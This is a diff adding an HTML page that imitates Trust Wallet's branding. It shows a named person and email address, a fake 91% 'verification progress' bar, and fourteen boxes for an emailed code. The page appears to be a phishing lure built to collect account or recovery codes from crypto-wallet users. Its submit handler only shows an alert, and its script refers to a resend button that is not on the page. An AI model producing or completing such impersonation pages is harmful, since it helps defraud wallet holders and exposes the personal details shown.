@@ -1,0 +1,277 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Enter Verification Code - Trust Wallet</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        /* Trust Wallet color scheme */
+        :root {
+            --trust-blue: #0052ff;
+            --trust-dark: #0c0f24;
+            --trust-card: #1a1d35;
+            --trust-light: #2a2e4d;
+        }
+        
+        body {
+            background-color: var(--trust-dark);
+        }
+        
+        .trust-card {
+            background-color: var(--trust-card);
+            border-radius: 16px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
+        }
+        
+        .trust-button {
+            background-color: var(--trust-blue);
+            border-radius: 12px;
+            transition: all 0.3s ease;
+        }
+        
+        .trust-button:hover {
+            background-color: #0046d9;
+            transform: translateY(-2px);
+        }
+        
+        .trust-secondary {
+            background-color: var(--trust-light);
+            border-radius: 12px;
+            transition: all 0.3s ease;
+        }
+        
+        .trust-secondary:hover {
+            background-color: #34385c;
+        }
+        
+        /* Code input styling */
+        .code-input-container {
+            display: flex;
+            justify-content: center;
+            gap: 8px;
+            margin-bottom: 10px;
+        }
+        
+        .code-input {
+            width: 40px;
+            height: 50px;
+            text-align: center;
+            font-size: 18px;
+            font-weight: bold;
+            border: 2px solid #2a2e4d;
+            border-radius: 8px;
+            background-color: #0c0f24;
+            color: white;
+            transition: all 0.2s ease;
+        }
+        
+        .code-input:focus {
+            border-color: var(--trust-blue);
+            background-color: #1a1d35;
+            outline: none;
+            box-shadow: 0 0 0 3px rgba(0, 82, 255, 0.2);
+        }
+        
+        /* Progress bar */
+        .custom-progress {
+            height: 6px;
+            background-color: #2a2e4d;
+            border-radius: 3px;
+            overflow: hidden;
+            margin-bottom: 8px;
+        }
+        
+        .custom-progress-fill {
+            height: 100%;
+            background: linear-gradient(90deg, var(--trust-blue), #3375ff);
+            width: 91%;
+            transition: width 0.5s ease;
+        }
+        
+        /* Responsive adjustments */
+        @media (max-width: 480px) {
+            .code-input {
+                width: 36px;
+                height: 46px;
+                font-size: 16px;
+            }
+            
+            .code-input-container {
+                gap: 6px;
+            }
+        }
+    </style>
+</head>
+<body class="min-h-screen flex items-center justify-center p-4">
+    <div class="max-w-md w-full trust-card overflow-hidden">
+        <!-- Header -->
+        <div class="py-5 px-6 border-b border-[#2a2e4d]">
+            <div class="flex items-center justify-center">
+                <div class="w-12 h-12 rounded-full bg-gradient-to-r from-[#0052ff] to-[#3375ff] flex items-center justify-center mr-3">
+                    <i class="fas fa-wallet text-white text-xl"></i>
+                </div>
+                <h1 class="text-white text-xl font-bold">Trust Wallet</h1>
+            </div>
+        </div>
+        
+        <!-- Content -->
+        <div class="p-6">
+            <!-- Status Icon -->
+            <div class="flex justify-center mb-6">
+                <div class="w-20 h-20 rounded-full bg-gradient-to-r from-[#0052ff] to-[#3375ff] flex items-center justify-center">
+                    <i class="fas fa-shield-alt text-white text-3xl"></i>
+                </div>
+            </div>
+            
+            <!-- Status Text -->
+            <h2 class="text-white font-bold text-center text-xl mb-4">Enter Verification Code</h2>
+            
+            <!-- User Information -->
+            <div class="mb-4">
+                <small class="text-gray-400 text-sm">Verification for</small>
+                <div class="mt-1">
+                    <small class="text-gray-300">lisa touchstone</small>
+                    <small class="text-gray-400 mx-2">•</small>
+                    <small class="text-gray-300">lisatouchstone123@gmail.com</small>
+                </div>
+            </div>
+            
+            <!-- Progress Bar -->
+            <div class="mb-6">
+                <div class="custom-progress">
+                    <div class="custom-progress-fill"></div>
+                </div>
+                <p class="text-center text-gray-400 text-sm">Verification progress (91%)</p>
+            </div>
+            
+            <!-- Code Input Section -->
+            <div class="mb-6">
+                <p class="text-center text-gray-300 mb-4">Enter the 14-digit code sent to your email</p>
+                
+                <!-- First row of 7 boxes -->
+                <div class="code-input-container">
+                    <input type="text" maxlength="1" class="code-input" id="digit1">
+                    <input type="text" maxlength="1" class="code-input" id="digit2">
+                    <input type="text" maxlength="1" class="code-input" id="digit3">
+                    <input type="text" maxlength="1" class="code-input" id="digit4">
+                    <input type="text" maxlength="1" class="code-input" id="digit5">
+                    <input type="text" maxlength="1" class="code-input" id="digit6">
+                    <input type="text" maxlength="1" class="code-input" id="digit7">
+                </div>
+                
+                <!-- Second row of 7 boxes -->
+                <div class="code-input-container">
+                    <input type="text" maxlength="1" class="code-input" id="digit8">
+                    <input type="text" maxlength="1" class="code-input" id="digit9">
+                    <input type="text" maxlength="1" class="code-input" id="digit10">
+                    <input type="text" maxlength="1" class="code-input" id="digit11">
+                    <input type="text" maxlength="1" class="code-input" id="digit12">
+                    <input type="text" maxlength="1" class="code-input" id="digit13">
+                    <input type="text" maxlength="1" class="code-input" id="digit14">
+                </div>
+            </div>
+            
+            <!-- Simple Instruction -->
+            <div class="bg-[#2a2e4d] rounded-lg p-4 mb-6">
+                <p class="text-gray-300 text-sm text-center">
+                    Please enter the complete 14-digit verification code to proceed
+                </p>
+            </div>
+            
+            <!-- Action Buttons -->
+            <div class="space-y-3">
+                <button class="w-full trust-button text-white font-medium py-3 px-4 rounded-lg">
+                    Verify Code
+                </button>
+
+            </div>
+            
+            <!-- Help Text -->
+            <p class="text-center text-gray-500 text-sm mt-6">
+                Need help? <a href="#" class="text-[#3375ff] hover:underline">Contact Support</a>
+            </p>
+        </div>
+        
+        <!-- Footer -->
+        <div class="py-4 px-6 border-t border-[#2a2e4d]">
+            <div class="flex justify-center space-x-6 text-gray-500 text-sm">
+                <a href="#" class="hover:text-[#3375ff]">Privacy</a>
+                <a href="#" class="hover:text-[#3375ff]">Terms</a>
+                <a href="#" class="hover:text-[#3375ff]">Support</a>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // Auto-focus and navigation for code input fields
+        document.addEventListener('DOMContentLoaded', function() {
+            const inputs = document.querySelectorAll('.code-input');
+            
+            inputs.forEach((input, index) => {
+                // Focus on first input
+                if (index === 0) {
+                    input.focus();
+                }
+                
+                // Handle input
+                input.addEventListener('input', function(e) {
+                    // Only allow numeric input
+                    this.value = this.value.replace(/[^0-9]/g, '');
+                    
+                    if (this.value.length === 1) {
+                        if (index < inputs.length - 1) {
+                            inputs[index + 1].focus();
+                        }
+                    }
+                });
+                
+                // Handle backspace
+                input.addEventListener('keydown', function(e) {
+                    if (e.key === 'Backspace' && this.value.length === 0) {
+                        if (index > 0) {
+                            inputs[index - 1].focus();
+                        }
+                    }
+                });
+                
+                // Handle paste event for the entire code
+                input.addEventListener('paste', function(e) {
+                    e.preventDefault();
+                    const pasteData = e.clipboardData.getData('text').replace(/[^0-9]/g, '');
+                    
+                    if (pasteData.length === 14) {
+                        for (let i = 0; i < 14; i++) {
+                            if (inputs[i]) {
+                                inputs[i].value = pasteData[i] || '';
+                            }
+                        }
+                        inputs[13].focus();
+                    }
+                });
+            });
+            
+            // Submit button functionality
+            document.querySelector('.trust-button').addEventListener('click', function() {
+                let code = '';
+                inputs.forEach(input => {
+                    code += input.value;
+                });
+                
+                if (code.length === 14) {
+                    alert('Code submitted: ' + code);
+                    // In a real application, you would submit the code to the server here
+                } else {
+                    alert('Please enter the complete 14-digit code');
+                }
+            });
+            
+            // Resend code button functionality
+            document.querySelector('.trust-secondary').addEventListener('click', function() {
+                alert('A new verification code has been sent to your email');
+            });
+        });
+    </script>
+</body>
+</html>
